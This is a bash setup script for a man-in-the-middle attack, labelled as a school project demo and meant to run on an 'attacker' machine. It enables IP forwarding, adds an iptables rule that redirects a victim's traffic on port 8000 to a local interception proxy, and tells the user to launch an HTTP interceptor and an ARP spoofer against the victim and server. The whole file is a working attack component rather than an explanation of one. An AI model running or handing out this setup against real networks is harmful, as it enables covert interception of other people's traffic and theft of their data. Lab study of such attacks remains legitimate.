#!/bin/bash
# ============================================================
# MITM Setup Script - School Project Demonstration
# Run this on the ATTACKER machine (Linux VM)
# ============================================================
# Usage: sudo ./setup_mitm.sh <victim_ip> <server_ip> [interface]
# Example: sudo ./setup_mitm.sh 192.168.1.10 192.168.1.20 eth0
# ============================================================

set -e

VICTIM_IP="$1"
SERVER_IP="$2"
IFACE="${3:-eth0}"
PROXY_PORT=8080
TARGET_PORT=8000

if [ -z "$VICTIM_IP" ] || [ -z "$SERVER_IP" ]; then
    echo "Usage: sudo $0 <victim_ip> <server_ip> [interface]"
    echo "Example: sudo $0 192.168.1.10 192.168.1.20 eth0"
    exit 1
fi

if [ "$EUID" -ne 0 ]; then
    echo "[!] This script must be run as root (sudo)."
    exit 1
fi

echo "============================================"
echo "  MITM Attack Setup - School Project Demo"
echo "============================================"
echo "[*] Victim IP  : $VICTIM_IP"
echo "[*] Server IP  : $SERVER_IP"
echo "[*] Interface  : $IFACE"
echo "[*] Proxy Port : $PROXY_PORT"
echo "[*] Target Port: $TARGET_PORT"
echo "============================================"
echo ""

# Step 1: Enable IP forwarding so packets flow through us
echo "[1/3] Enabling IP forwarding..."
echo 1 > /proc/sys/net/ipv4/ip_forward
echo "      Done."

# Step 2: Set up iptables to redirect HTTP traffic to our proxy
echo "[2/3] Setting up iptables redirect..."
# Redirect traffic from the victim destined for port 8000 to our local proxy
iptables -t nat -A PREROUTING -p tcp -s "$VICTIM_IP" --dport "$TARGET_PORT" -j REDIRECT --to-port "$PROXY_PORT"
echo "      Traffic from $VICTIM_IP:$TARGET_PORT -> localhost:$PROXY_PORT"

# Step 3: Display instructions
echo "[3/3] Setup complete!"
echo ""
echo "============================================"
echo "  NOW OPEN TWO MORE TERMINALS AND RUN:"
echo "============================================"
echo ""
echo "  Terminal 1 (HTTP Interceptor):"
echo "    python3 http_interceptor.py --port $PROXY_PORT"
echo ""
echo "  Terminal 2 (ARP Spoofer):"
echo "    sudo python3 arp_spoof.py --victim $VICTIM_IP --gateway $SERVER_IP --iface $IFACE"
echo ""
echo "============================================"
echo ""
echo "To clean up when done, run:"
echo "    sudo ./cleanup_mitm.sh"
echo ""
